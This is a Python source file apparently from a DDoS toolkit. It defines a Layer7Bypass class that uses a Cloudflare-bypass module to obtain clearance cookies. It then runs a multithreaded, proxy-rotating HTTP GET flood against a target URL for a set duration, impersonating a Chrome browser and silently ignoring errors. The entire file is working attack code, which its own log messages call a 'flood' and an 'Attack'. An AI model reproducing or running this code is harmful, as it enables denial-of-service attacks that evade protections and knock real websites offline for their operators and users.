import asyncio
import time
import random
from curl_cffi import requests as cffi_requests
from core.cf_bypass import CloudflareBypasser
from core.colors import log_info, log_success, log_warning, log_danger
from concurrent.futures import ThreadPoolExecutor

class Layer7Bypass:
    def __init__(self, target, threads=100, time=300, proxies=None):
        self.target = target
        self.threads = threads
        self.time = time
        self.proxies = proxies
        # Initialize bypasser to get cookies/session
        self.cf = CloudflareBypasser(target, proxies=proxies)
        self.session_data = self.cf.bypass()

    def cfb_flood_worker(self):
        if not self.session_data:
            return

        end_time = time.time() + self.time
        session = cffi_requests.Session(impersonate="chrome110")
        session.cookies.update(self.session_data['cookies'])
        headers = {"User-Agent": self.session_data['user_agent'], "Connection": "keep-alive"}

        while time.time() < end_time:
            try:
                # Use proxy if provided
                proxy = random.choice(self.proxies) if self.proxies else None
                proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                
                session.get(self.target, headers=headers, proxies=proxies_dict, timeout=5)
            except Exception:
                pass

    def run_cfb(self):
        if not self.session_data:
            log_danger("Cannot start CFB flood: Failed to bypass Cloudflare initially.")
            return

        log_info(f"Starting CFB (Cloudflare Bypass) flood on {self.target} with {self.threads} threads...")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.cfb_flood_worker)
        log_success("CFB Attack Finished.")
